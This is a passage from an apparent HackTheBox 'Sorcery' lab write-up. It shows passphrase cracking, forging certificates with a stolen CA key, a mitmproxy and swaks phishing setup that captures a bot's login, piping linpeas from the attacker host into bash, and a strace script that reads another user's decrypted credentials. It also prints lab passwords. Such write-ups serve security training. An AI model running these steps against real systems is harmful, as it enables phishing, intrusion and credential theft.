83983ca2b0a27f722970c77aa57135a6500fca2a0590d94e1c95eadd439cc0b607faa78c93d6a5aa26798c50da687d7fa1a1dd2a21f46712b319396fe92393b05304e5e74a2fb9a14122a8015448b0c2221ac92c6bc24922a102dab7610d718f80bf8e1f25d255df980c59cbecbcbe7a0248db4c730ec6d13c30fc34d8a039ef8a6e10680c29c75b7b97f69c5e7e0b962f48d16dd6b25ecb478d29919b00a2a08a2aeb9d2d00bba8e3ef497b6002ffadbcd5a6cc701604ab2b8884f3d00d27cc8119a88ed8f19661986934c8adf6c30be687c72a45df28542d51a4b8ac1912b47746f2374de1af7640d208ed50dfc2b6de3b4f0ccbd12e5a64a2c1091aa5c2f78117eebe2b41f59c37f7caad56340f367a60d334f6f6faa0e5cb0e064fc5b5630deca101d8d56d19e0e4769ab1abbac6c48f010f51644b0d44b77dc493ba4fd44d9a3c00045f9840e182c58dfb994e90695787c09abf2c6c028628326934e08030d5fc98a326266ed7e5cc7bf6a0215e8b69818ee6599d174967900451e02f12ff8b98df8cafe06a4f78f3bdd9d64f2e1731542da1f1985b0bf87a4181dfa6115ff7b1ccb81c78bc3f7e096d6f875e75300609dcb24aa7b1807905df2dd8fd9d0d025952526000d70e4028b368b07c5ea4d5e3e0343d9a69818abc2d951576b765433622efc38855289e92ed055ef2aa9f5b5b4bc08ace06fa8969000c2b2a002483607ea180958fec3a51e35bd1ad339a0e4e6b4c1a024990f833672e752331d6827fc4f779256af563342be75a1b7ee1cd11b67d0a6df07ec0b30e5735718c03b5aed06e53a915233f81f3f50363c3613260feb97511d9a3a9253731c51c74e9ddc4f597c4106ed537759e51a044bf555d96e97e56713863ee14ae533eb651b0217ca29693407a0a0fe57a95c6c40de75f816bb5346cb68e1692a423144993c63c225f89152ea453ca162ee130328913f6e6e745e01ff3c2ca9a2c41ca0a0e4bd0d345baa8b4161e9b8cc5e7ce7e31794f67c0f871cd350d6188da0423adecc1b20766c4bd9bd67a0fd7620742096d0b9ad92003f74df0d2c0733ffdee54d3655403a91c0bfbc7b6d99fc20ad094503a458790ec0d76b57f1ddbbf986874245520b9cb2ef79c07e8b9640ddc5de426ea9a1316f66208ec2dfb03c6bd5fcf439d8087c01d6d9fddffa29845b8abbf314e5fa339fe957337b794225709368bcfcc11b9155c37ee97a108d0d8effda44b6d8805ad84584dfe12f92dbacf6f97cf24cfa8dcf19fc79a03264e22748976a84556aa811a06f5237820899acaa3c2212d07184767d2d2c4e15161de1e8117f4fee06f5b0bd2f183a6318e075a4fb214eb0becfa11a914f5e6a69a259ebd55f1db5901c9ca0ad04f2d1e972d96923ca99d034f887c403f7908b51566edfff25af42024cc589a8916869855bb5cd5d77ae01b5ce88faa65d6191d262efbe65e24d223b6adc7732694c79f99956848e8363162af268f1bb508afab569b39bd14b12c6e77a641d10f44cc5b3aeb27418e97f7baa553b1506e94ae470ddadf181c574cbc1a4ccd526c9e56bb354b2e7b275ee2de96df11e70f553602850ba0528cc79e105591875b2b5ca8353193c08b61ead284188b24779e290e1e6ae2fbe12a502fc45b876f84eb93ab83d4e87212cf1adfc578716bc771650b31fe3046042b24c577c09b0a72340e6edf638a1dcf7d512f45845a729f11fd3b8666822b8d1069198e9a3001afd0f6f25cd3faa792cde520a034b120595df3707039cb2a52998edce6902981120aa00197fda0b6bd4a13d2cde567500ada5bca9e63340c283c97dc115f6ca3eba5a691bb1c42c298aef7d369d3324956d7527325d8fd1e6b45113b63be6615c78981de2e5cb959d9ee2aefe9c7a7f0b5494b379a7f606cfe35cb9b4f57560618ce9f2b86496168539cdbdaed0faa9ec3e804ffc81c224ef11e1c43021823ff7362e0d234d502900b9dffa80d54e0b8343352af5822f92e0068b6ded27b76f1b4752e0c94333feb87bd9275d85694aed83333fbec85b8be664cdfe4ac849e898c22975ce1d7863e2e009deed1059e7e61ebb0fa9b60a89f9588e8a58f5b7964ff6144db12f5a219083911ff06f0a6bde809e51a19665274cf1c8c8fb799a15408fa64e1b5c0b8a32b6fe74e6d8f03c8f999c9113a5921cb60a433adb51a25fca7d41ad3c5488070d59191a844680ca475f7716b948331f87ed938c07f09381b21422a8c77a19e8bfb03760c92589545d3199fa902f73f1bc4cea6882bb15098357571b27c236d75f9bc345005b262bc195808910fe199aa76dceaaef98b1577cfb061bb3bb5bc8dc6ea8ad82507e395958d8c9a89d2fc78be3173644ad20c862738731ddb5f1e5126d1165b1989d97b8e1d3eaa1b36b6243c57b47c2bad9ad8ab58640a232522223c1d7fed95da5a6713920a0298f8a773e8ec781680f83be147f3e0392eaa205b54eed1bd9276ffb5b79ee11ab596d1a41b03bc95642981608df1d493bb2e4071294d119ca1c6e152e0c11f8754ace4a2c50ba67aae183c3a837b4b01201b32f0c9939306967a74c3ab837b9aefc4957268a7d022c28b8c9c65e4fe77171ff369cc7614b3af00dc923b8f468a695d97df81f
```

Looking into example hashes [https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) `$PEM$1$4` is `SHA1` format, however `x509` output showed `SHA256` instead! (Change `$1` to `$2`)
```bash
âžœ .\hashcat.exe  -a 0 -m 24420 .\hashes.txt .\rockyou.txt
$PEM$2$4$e0..1f:password
```

Amazing.

```bash
â””â”€$ openssl rsa -in RootCA.key -noout -text | grep -v ':..:'
Enter pass phrase for RootCA.key: password
Private-Key: (4096 bit, 2 primes)
modulus:
publicExponent: 65537 (0x10001)
privateExponent: 81:65
prime1:          b3:67
prime2:          21:db
exponent1:       62:2d
exponent2:       ab
coefficient:     15
```

We have legitimate certificates to forge new certificate and impersonate the domain.

### Phishing

Now that we are able to manipulate DNS legitimately now we can do Phishing! (Looking at you tom)

First we will need to get a valid certificate which will be used to serve websites.
```bash
# Create fresh certificate
â””â”€$ openssl req -new -newkey rsa:2048 -nodes -keyout LetMeIn.key -out LetMeIn.csr -subj "/CN=letmein.sorcery.htb"
# Sign the certificate
â””â”€$ openssl x509 -req -in LetMeIn.csr -out LetMeIn.crt -CA RootCA.crt -CAkey RootCA.key -CAcreateserial -days 365 -sha256
Certificate request self-signature ok
subject=CN=letmein.sorcery.htb
Enter pass phrase for RootCA.key: password
```

There was a mail service and a `mail_bot`. We probably can ignore `mail_bot` since it will mostly emulate user tom~~
```bash
â””â”€$ curl https://github.com/andrew-d/static-binaries/raw/refs/heads/master/binaries/linux/x86_64/nmap -LOs
(remote) user@7bfb70ee5b9c:/tmp$ python3 -c "import urllib.request; urllib.request.urlretrieve('http://10.10.14.39/nmap', '/tmp/nmap')"
(remote) user@7bfb70ee5b9c:/tmp$ chmod +x /tmp/nmap
(remote) user@7bfb70ee5b9c:/tmp$ touch /tmp/nmap-services /tmp/nmap-payloads
(remote) user@7bfb70ee5b9c:/tmp$ /tmp/nmap -Pn -p- -T5 mail
PORT     STATE SERVICE
1025/tcp open  unknown
8025/tcp open  unknown
```

![Writeup-21.png](/assets/pentest/htb/sorcery/Writeup-21.png)

We are going to need a reverse proxy: [https://docs.mitmproxy.org/stable/concepts/modes/#reverse-proxy](https://docs.mitmproxy.org/stable/concepts/modes/#reverse-proxy)
```
â””â”€$ pipx install mitmproxy
```

With a **PEM** certificate: [https://docs.mitmproxy.org/stable/concepts/certificates/#using-a-custom-server-certificate](https://docs.mitmproxy.org/stable/concepts/certificates/#using-a-custom-server-certificate).

To create a **PEM file** from a `.crt` and `.key`, simply concatenate the two files:
```bash
â””â”€$ cat LetMeIn.crt LetMeIn.key > LetMeIn.pem
```

Log all the traffic to stdout:
```python
â””â”€$ nano dump.py
def response(flow):
    print(f"\n== {flow.request.method} {flow.request.pretty_url}")
    print(f"-- Request Headers:\n{flow.request.headers}")
    print(f"-- Request Body:\n{flow.request.text}")
    print(f"-- Response Code: {flow.response.status_code}")
    print(f"-- Response Headers:\n{flow.response.headers}")
    print(f"-- Response Body:\n{flow.response.text}")
```

Start proxy:
```bash
mitmproxy --mode reverse:https://git.sorcery.htb@443 --certs letmein.sorcery.htb=LetMeIn.pem --ssl-insecure -s dump.py
```

Send the email to tom:
```bash
â””â”€$ proxychains swaks --to tom_summers@sorcery.htb --from admin@sorcery.htb --server mail:1025 --header "Subject: ðŸ§™ Unlock the Magic" --body 'I found something _mysterious_ at https://letmein.sorcery.htb â€” please click it, I swear itâ€™s only _mildly_ cursed. ðŸ‘¾'
```

We don't need to  be very innovative since bot will click anything.

![Writeup-22.png](/assets/pentest/htb/sorcery/Writeup-22.png)

**Amazing fail**. We need to include `/user/login` to the url!

I don't think the script worked, but we can manually view Request, Response and Detail

![Writeup-24.png](/assets/pentest/htb/sorcery/Writeup-24.png)

![Writeup-23.png](/assets/pentest/htb/sorcery/Writeup-23.png)

> Creds: `tom_summers:jNsMKQ6k2.XDMPu.`

## SSH

```bash
â””â”€$ sshpass -p 'jNsMKQ6k2.XDMPu.' ssh tom_summers@sorcery.htb
tom_summers@main:~$ id
uid=2001(tom_summers) gid=2001(tom_summers) groups=2001(tom_summers)
```

### User.txt

```
tom_summers@main:~$ cat  user.txt
db93653549fd4d4da77afc271363fc17
```

## Privilege Escalation (tom_summers_admin)

No sudo.
```bash
tom_summers@main:~$ sudo -l
[sudo] password for tom_summers:
Sorry, user tom_summers may not run sudo on localhost.
```


Enumerate the system:
```bash
tom_summers@main:~$ curl 10.10.14.39/linpeas.sh | bash | tee linpeas.log
                â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£ Processes, Crons, Timers, Services and Sockets â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
                â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
â•”â•â•â•â•â•â•â•â•â•â•â•£ Running processes (cleaned)
â•š Check weird & unexpected proceses run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes
...
root        1414  0.0  0.0  13332  2560 ?        Ss   04:01   0:00 /usr/sbin/cron -f -P
root        1460  0.0  0.0  27592  4100 ?        S    04:01   0:00  _ /usr/sbin/CRON -f -P
tom_sum+    1466  0.0  0.0   2800  1536 ?        Ss   04:01   0:00      _ /bin/sh -c /provision/cron/tom_summers_admin/text-editor.sh
tom_sum+    1470  0.0  0.0   4752  3072 ?        S    04:01   0:00          _ /bin/bash /provision/cron/tom_summers_admin/text-editor.sh
tom_sum+    1479  0.0  1.1 626644 91384 ?        Sl   04:01   0:00              _ /usr/bin/mousepad /provision/cron/tom_summers_admin/passwords.txt
...
root        1446  1.1  1.2 3633264 99152 ?       Ssl  04:01   7:23 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
root        2514  0.0  0.0 1671708 4480 ?        Sl   04:01   0:00  _ /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 5000 -container-ip 172.21.0.2 -container-port 5000 -use-listen-fd
root        2882  0.0  0.0 1671708 4352 ?        Sl   04:01   0:00  _ /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 88 -container-ip 172.23.0.2 -container-port 88 -use-listen-fd
root        2888  0.0  0.0 1597720 4224 ?        Sl   04:01   0:00  _ /usr/bin/docker-proxy -proto udp -host-ip 127.0.0.1 -host-port 88 -container-ip 172.23.0.2 -container-port 88 -use-listen-fd
root        2896  0.0  0.0 1745440 4480 ?        Sl   04:01   0:00  _ /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 389 -container-ip 172.23.0.2 -container-port 389 -use-listen-fd
root        2902  0.0  0.0 1745440 4352 ?        Sl   04:01   0:00  _ /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 464 -container-ip 172.23.0.2 -container-port 464 -use-listen-fd
root        2910  0.0  0.0 1819172 4480 ?        Sl   04:01   0:00  _ /usr/bin/docker-proxy -proto udp -host-ip 127.0.0.1 -host-port 464 -container-ip 172.23.0.2 -container-port 464 -use-listen-fd
root        2917  0.0  0.0 1745440 4352 ?        Sl   04:01   0:00  _ /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 636 -container-ip 172.23.0.2 -container-port 636 -use-listen-fd
root       11204  0.0  0.0 1671708 4480 ?        Sl   04:04   0:00  _ /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 443 -container-ip 172.19.0.2 -container-port 443 -use-listen-fd
root       11213  0.0  0.0 1745440 4608 ?        Sl   04:04   0:00  _ /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 443 -container-ip 172.19.0.2 -container-port 443 -use-listen-fd
tom_sum+    1477  0.0  0.7 227012 60584 ?        S    04:01   0:00 /usr/bin/Xvfb :1 -fbdir /xorg/xvfb -screen 0 512x256x24 -nolisten local # ORANGE, EXPLOITABLE probably
...
â•”â•â•â•â•â•â•â•â•â•â•â•£ Hostname, hosts and DNS
main.sorcery.htb
127.0.0.1 localhost main.sorcery.htb sorcery sorcery.htb
127.0.1.1 ubuntu-2404

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.23.0.2 dc01.sorcery.htb

nameserver 127.0.0.53
options edns0 trust-ad
search .
â•”â•â•â•â•â•â•â•â•â•â•â•£ Analyzing FreeIPA Files (limit 70)
â•š https://book.hacktricks.wiki/en/linux-hardening/freeipa-pentesting.html
drwxr-xr-x 3 root root 4096 Oct 30  2024 /etc/ipa
-rw-r--r-- 1 root root 230 Oct 30  2024 /etc/ipa/default.conf
#File modified by ipa-client-install
[global]
basedn = dc=sorcery,dc=htb
realm = SORCERY.HTB
domain = sorcery.htb
server = dc01.sorcery.htb
host = main.sorcery.htb
xmlrpc_uri = https://dc01.sorcery.htb/ipa/xml
enable_ra = True

-rwxr-xr-x 1 root root 987 Apr 12  2024 /usr/bin/ipa
drwxr-xr-x 3 root root 4096 Oct 30  2024 /usr/lib/ipa
drw-r-xr-x 2 root root 4096 Apr 12  2024 /usr/share/bash-completion/completions/ipa
drwxr-xr-x 3 root root 4096 Oct 30  2024 /usr/share/ipa
drwxr-xr-x 2 root root 4096 Jun  9 13:10 /usr/src/linux-headers-6.8.0-60/drivers/net/ipa

â•”â•â•â•â•â•â•â•â•â•â•â•£ Searching kerberos conf files and tickets
â•š https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-active-directory.html#linux-active-directory
kadmin was found on /usr/bin/kadmin
kadmin was found on /usr/bin/kinit
klist execution
ptrace protection is disabled (0), you might find tickets inside processes memory
-rw-r--r-- 1 root root 789 Jul 22 14:05 /etc/krb5.conf
#File modified by ipa-client-install

includedir /etc/krb5.conf.d/
[libdefaults]
  default_realm = SORCERY.HTB
  dns_lookup_realm = false
  rdns = false
  dns_canonicalize_hostname = false
  dns_lookup_kdc = true
  ticket_lifetime = 24h
  forwardable = true
  udp_preference_limit = 0
  default_ccache_name = KEYRING:persistent:%{uid}


[realms]
  SORCERY.HTB = {
    kdc = dc01.sorcery.htb:88
    master_kdc = dc01.sorcery.htb:88
    admin_server = dc01.sorcery.htb:749
    kpasswd_server = dc01.sorcery.htb:464
    default_domain = sorcery.htb
    pkinit_anchors = FILE:/var/lib/ipa-client/pki/kdc-ca-bundle.pem
    pkinit_pool = FILE:/var/lib/ipa-client/pki/ca-bundle.pem

  }

[domain_realm]
  .sorcery.htb = SORCERY.HTB
  sorcery.htb = SORCERY.HTB
  main.sorcery.htb = SORCERY.HTB

-rw-r--r-- 1 root root 192 Oct 23  2024 /usr/lib/x86_64-linux-gnu/sssd/conf/sssd.conf
[sssd]
domains = shadowutils

[nss]

[pam]

[domain/shadowutils]
id_provider = proxy
proxy_lib_name = files

auth_provider = proxy
proxy_pam_target = sssd-shadowutils

proxy_fast_alias = True
tickets kerberos Not Found
klist Not Found
â•”â•â•â•â•â•â•â•â•â•â•â•£ Active Ports
â•š https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:636           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:88            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:389           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:464           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::443                  :::*                    LISTEN      -
â•”â•â•â•â•â•â•â•â•â•â•â•£ .sh files in path
â•š https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path
/usr/bin/gettext.sh
/usr/bin/dockerd-rootless.sh
/usr/bin/dockerd-rootless-setuptool.sh
/usr/bin/rescan-scsi-bus.sh
â•”â•â•â•â•â•â•â•â•â•â•â•£ Unexpected in /opt (usually empty)
total 16
drwxr-xr-x  4 root  root   4096 Apr 24 12:57 .
drwxr-xr-x 25 root  root   4096 Apr 28 12:11 ..
drwx--x--x  4 root  root   4096 Oct 31  2024 containerd
drwx------  2 admin admins 4096 Apr 25 12:43 scripts

â•”â•â•â•â•â•â•â•â•â•â•â•£ Unexpected in root
/bin.usr-is-merged
/xorg
/sbin.usr-is-merged
/lib.usr-is-merged
/provision
â•”â•â•â•â•â•â•â•â•â•â•â•£ Modified interesting files in the last 5mins (limit 100)
...
/home/tom_summers/.gnupg/pubring.kbx
/home/tom_summers/.gnupg/trustdb.gpg
â•”â•â•â•â•â•â•â•â•â•â•â•£ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-r--r--r-- 1 tom_summers_admin tom_summers_admin 11 Jul 22 04:01 /tmp/.X1-lock
```

First thing we see is X11, which is a *windowing system used for graphical user interfaces on Unix-like operating systems and others*.

`tom_summers` is also an admin, but with `tom_summers_admin` account which seems to be logged in with X11.
```bash
tom_summers@main:~$ grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
user:x:1000:1000:user:/home/user:/bin/bash
vagrant:x:1001:1001::/home/vagrant:/usr/bin/bash
tom_summers:x:2001:2001::/home/tom_summers:/usr/bin/bash
tom_summers_admin:x:2002:2002::/home/tom_summers_admin:/usr/bin/bash
rebecca_smith:x:2003:2003::/home/rebecca_smith:/usr/bin/bash
```

Also there's a DC server running at `dc01.sorcery.htb`, on Linux? 

### Xorg

First easy targets of elimination:
```bash
tom_summers@main:/$ ls -Alh /opt
total 8.0K
drwx--x--x 4 root  root   4.0K Oct 31  2024 containerd
drwx------ 2 admin admins 4.0K Apr 25 12:43 scripts
tom_summers@main:/$ ls -dlh provision
drwx--x--x 3 vagrant vagrant 4.0K Apr 28 12:07 provision
tom_summers@main:/$ find xorg/ -ls
    57613      4 drwxr-xr-x   3 root     root         4096 Apr 28 12:07 xorg/
    57614      4 drwxr-xr-x   2 tom_summers_admin tom_summers_admin     4096 Jul 22 04:01 xorg/xvfb
     3055    516 -rwxr--r--   1 tom_summers_admin tom_summers_admin   527520 Jul 22 04:01 xorg/xvfb/Xvfb_screen0
tom_summers@main:/$ file xorg/xvfb/Xvfb_screen0
xorg/xvfb/Xvfb_screen0: X-Window screen dump image data, version X11, "Xvfb main.sorcery.htb:1.0", 512x256x24, 256 colors 256 entries
```

1. We cannot access scripts as we are not admin (or part of admins group).
2. `provision` folder is used for something, but we can't list files; However we can cat the files if we know exact filenames.
3. Only 1 session in Xorg and it's admin.
4. **X-Window screen dump image data** is a raw capture of the contents of an X11 display (the graphical desktop) saved as pixel data.

```bash
â””â”€$ sshpass -p 'jNsMKQ6k2.XDMPu.' scp tom_summers@sorcery.htb:/xorg/xvfb/Xvfb_screen0 screen.xwd
â””â”€$ xwud -in screen.xwd
```

![Writeup-25.png](/assets/pentest/htb/sorcery/Writeup-25.png)

> Creds: `tom_summers_admin:dWpuk7cesBjT-`

## Privilege Escalation (rebecca_smith)

```bash
â””â”€$ sshpass -p 'dWpuk7cesBjT-' ssh tom_summers_admin@sorcery.htb
tom_summers_admin@main:~$ id
uid=2002(tom_summers_admin) gid=2002(tom_summers_admin) groups=2002(tom_summers_admin)
```

Oddly enough this user is not part of `admins` group, so no luck in `/opt/scripts` again.

We are allowed to run **docker** and **strace** as **rebecca_smith**
```bash
tom_summers_admin@main:~$ sudo -l
Matching Defaults entries for tom_summers_admin on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tom_summers_admin may run the following commands on localhost:
    (rebecca_smith) NOPASSWD: /usr/bin/docker login
    (rebecca_smith) NOPASSWD: /usr/bin/strace -s 128 -p [0-9]*
```

With docker login we can login into the Docker Registry.
```bash
â””â”€$ docker help login

Usage:  docker login [OPTIONS] [SERVER]

Log in to a Docker registry.
If no server is specified, the default is defined by the daemon.

Options:
  -p, --password string   Password
      --password-stdin    Take the password from stdin
  -u, --username string   Username
```

Even if we try to login DNS lookup fails.
```bash
tom_summers_admin@main:~$ sudo -u rebecca_smith docker login
This account might be protected by two-factor authentication
In case login fails, try logging in with <password><otp>
Authenticating with existing credentials... [Username: rebecca_smith]

i Info â†’ To login with a different account, run 'docker logout' followed by 'docker login'


Login did not succeed, error: permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Post "http://%2Fvar%2Frun%2Fdocker.sock/v1.50/auth": dial unix /var/run/docker.sock: connect: permission denied
Failed to start web-based login - falling back to command line login...

Log in with your Docker ID or email address to push and pull images from Docker Hub. If you don''t have a Docker ID, head over to https://hub.docker.com/ to create one.
You can log in with your password or a Personal Access Token (PAT). Using a limited-scope PAT grants better security and is required for organizations using SSO. Learn more at https://docs.docker.com/go/access-tokens/

Username (rebecca_smith):

i Info â†’ A Personal Access Token (PAT) can be used instead.
         To create a PAT, visit https://app.docker.com/settings

Password:
time="2025-07-22T15:12:07Z" level=info msg="Error logging in to endpoint, trying next endpoint" endpoint="{false https://registry-1.docker.io false true false 0xc00039b680}" error="Get \"https://registry-1.docker.io/v2/\": dial tcp: lookup registry-1.docker.io: Temporary failure in name resolution"
Get "https://registry-1.docker.io/v2/": dial tcp: lookup registry-1.docker.io: Temporary failure in name resolution
```

With `strace` we can see syscalls of processes with size limit of 128.
```bash
â””â”€$ man strace
       -p pid

       -s strsize
       --string-limit=strsize
                   Specify the maximum string size to print (the default is 32).  Note that filenames are not considered strings and are always printed in full.
```

With `strace` we can only read `rebecca_smith` processes, but if we `ps` for it there's nothing.
```bash
tom_summers_admin@main:~$ ps aux --forest | grep rebecca_smith
tom_sum+ 1134587  0.0  0.0   4088  1920 pts/0    S+   15:14   0:00              \_ grep rebecca_smith
```

### Pspy

```bash
tom_summers_admin@main:~$ curl -L -o /tmp/pspy 10.10.14.39/pspy64
tom_summers_admin@main:~$ chmod +x /tmp/pspy
tom_summers_admin@main:~$ /tmp/pspy | tee pspy.log | grep -iE '2003|rebecca_smith'
2025/07/22 15:40:35 CMD: UID=2002  PID=1177263 | grep -iE 2003|rebecca_smith
2025/07/22 15:42:01 CMD: UID=0     PID=1179726 | htpasswd -Bbc /home/vagrant/source/registry/auth/registry.password rebecca_smith -7eAZDp9-f9mg310463
2025/07/22 15:45:01 CMD: UID=0     PID=1184728 | htpasswd -Bbc /home/vagrant/source/registry/auth/registry.password rebecca_smith -7eAZDp9-f9mg310463
```

This creates or overwrites a password file used for basic HTTP authentication:
- `htpasswd`: Apache utility to manage user-password files.
- `-B`: Use bcrypt hashing (secure).
- `-b`: Password is given on command line (non-interactive).
- `-c`: Create a new file (overwrites if exists).
- `/home/vagrant/source/registry/auth/registry.password`: Path to password file.
- `rebecca_smith`: Username.
- `-7eAZDp9-f9mg310463`: Plaintext password (will be bcrypt-hashed in file).

The password doesn't work for either `docker login` or `su`

Observing the command outputs last 6 digit changes, however rest doesn't. `-7eAZDp9-f9mg` is the password and 6 digit must be 2FA code.
```bash
tom_summers_admin@main:~$ grep htpasswd pspy.log | grep -v grep
Every 2.0s: grep htpasswd pspy.log | grep -v grep                                                                                                                       main.sorcery.htb: Tue Jul 22 16:06:38 2025

2025/07/22 15:58:01 CMD: UID=0     PID=1206333 | htpasswd -Bbc /home/vagrant/source/registry/auth/registry.password rebecca_smith -7eAZDp9-f9mg780645
2025/07/22 16:06:01 CMD: UID=0     PID=1219938 | htpasswd -Bbc /home/vagrant/source/registry/auth/registry.password rebecca_smith -7eAZDp9-f9mg229732
```

> Creds: `rebecca_smith:-7eAZDp9-f9mg`

### Strace (From the future)

This part left a bitter taste, why were we given 2 sudo commands if not for priv esc? As of doing box 12 users are also pentesting which means it's likely that they are generating these commands (?).

`tom_summers_admin` has same credential store and access to helper binary.
```bash
tom_summers_admin@main:~$ cat ./.docker/config.json
{ "credsStore": "docker-auth" }
tom_summers_admin@main:~$ which docker-credential-docker-auth
/usr/bin/docker-credential-docker-auth
tom_summers_admin@main:~$ ls -lh /usr/bin/docker-credential-docker-auth
-rwxr-x--- 1 rebecca_smith tom_summers_admin 65M Apr  6 13:58 /usr/bin/docker-credential-docker-auth
```

Bruteforce the password retrieval process:
```bash
#!/bin/bash

WATCH_USER="rebecca_smith"
TARGET="docker-credential-docker-auth"
INTERVAL=1
OUTPUT="/tmp/strace_output.log"

truncate -s 0 "$OUTPUT"

while true; do
    sudo -u "$WATCH_USER" docker login 2>/dev/null >/dev/null &
    PID=$(pgrep -u "$WATCH_USER" -f "$TARGET")
    if [[ -n "$PID" ]]; then
        echo "[*] Found $TARGET (PID: $PID), attaching strace..."
        sudo -u "$WATCH_USER" strace -s 128 -p "$PID" >> "$OUTPUT" 2>&1 &
        STRACE_PID=$!
        wait "$STRACE_PID"
        echo "[*] strace (PID: $STRACE_PID) exited. Watching again..."
        break
    fi
    sleep "$INTERVAL"
done
```

```bash
tom_summers_admin@main:~$ ./brute.sh
[*] Found docker-credential-docker-auth (PID: 1336659), attaching strace...
[*] strace (PID: 1336694) exited. Watching again...
tom_summers_admin@main:~$ cat /tmp/strace_output.log | grep write
pwrite64(64, "ls/Lbtzq4b4D/ItZy5SchUvKEzgO7+XHLaVbze4KOKzZxqhsTRWdBmAw1Fcs/nWhIvQVLcoa5NF39WM3tv6jVA==", 88, 0) = 88
write(4, "\3", 1)                       = 1
â””â”€$ echo 'ls/Lbtzq4b4D/ItZy5SchUvKEzgO7+XHLaVbze4KOKzZxqhsTRWdBmAw1Fcs/nWhIvQVLcoa5NF39WM3tv6jVA==' \
  | base64 -d \
  | openssl enc -aes-128-cbc -d -K 00000000000000000000000000000000 -iv 00000000000000000000000000000000

{"Username":"rebecca_smith","Secret":"-7eAZDp9-f9mg"} 
```

> Creds: `rebecca_smith:-7eAZDp9-f9mg`

## Privilege Escalation (donna_adams)

No more sudo
```bash
â””â”€$ sshpass -p '-7eAZDp9-f9mg' ssh rebecca_smith@sorcery.htb
rebecca_smith@main:~$ id
uid=2003(rebecca_smith) gid=2003(rebecca_smith) groups=2003(rebecca_smith)
rebecca_smith@main:~$ sudo -l
Sorry, user rebecca_smith may not run sudo on localhost.
```

Interesting files in user's home directory:
```bash
rebecca_smith@main:~$ find -type f -ls
   564588      4 -rwx------   1 rebecca_smith rebecca_smith       84 Jul 22 15:01 ./.docker/config.json
   543370      4 -rwx------   1 rebecca_smith rebecca_smith       88 Jul 22 16:04 ./.docker/creds
   543334    120 -rw-rw-r--   1 rebecca_smith rebecca_smith   120768 Oct 30  2024 ./.net/docker-credential-docker-auth/AHB+oPKjMPcELNLFVIjxF0YthPk_+gg=/libMono.Unix.so
   564587    120 -rw-rw-r--   1 rebecca_smith rebecca_smith   120768 Jul 22 15:01 ./.net/docker-credential-docker-auth/gYUkbrOHlN3o8VyLImQ5jVw8cDGqzm8=/libMono.Unix.so
   565135      0 -rw-r--r--   1 rebecca_smith rebecca_smith        0 Jul 22 16:08 ./.cache/motd.legal-displayed
```

Creds file is gibberish when decoded from base64 
```bash
rebecca_smith@main:~$ cat .docker/creds ;echo
ls/Lbtzq4b4D/ItZy5SchUvKEzgO7+XHLaVbze4KOKzZxqhsTRWdBmAw1Fcs/nWhIvQVLcoa5NF39WM3tv6jVA==
```

```bash
rebecca_smith@main:~$ cat ./.docker/config.json;echo
{
        "auths": {
                "https://index.docker.io/v1/": {}
        },
        "credsStore": "docker-auth"
}
```

I was searching for `docker-auth`, but  it's called `docker-credential-docker-auth`
```bash
rebecca_smith@main:~$ docker
docker                         docker-credential-docker-auth  docker-proxy                   dockerd                        dockerd-rootless-setuptool.sh  dockerd-rootless.sh
```

According to docker this seems to be a helper script from [docker-credential-helpers](https://github.com/docker/docker-credential-helpers). Normally, Docker credential helpers follow this naming pattern: `docker-credential-<backend>`, But docker-credential-docker-auth is not part of any official package.

It's quite bulky for "helper". It's also owned by `tom_summers_admin` group with read/execute permissions.
```bash
rebecca_smith@main:~$ which docker-credential-docker-auth
/usr/bin/docker-credential-docker-auth
rebecca_smith@main:~$ ls -alh /usr/bin/docker-credential-docker-auth
-rwxr-x--- 1 rebecca_smith tom_summers_admin 65M Apr  6 13:58 /usr/bin/docker-credential-docker-auth
```

Docker service is active and reachable
```bash
rebecca_smith@main:~$ curl 0:5000/v2 -sL | jq -c
{"errors":[{"code":"UNAUTHORIZED","message":"authentication required","detail":null}]}
```

According to github README.md `get` takes server url via stdin
```bash
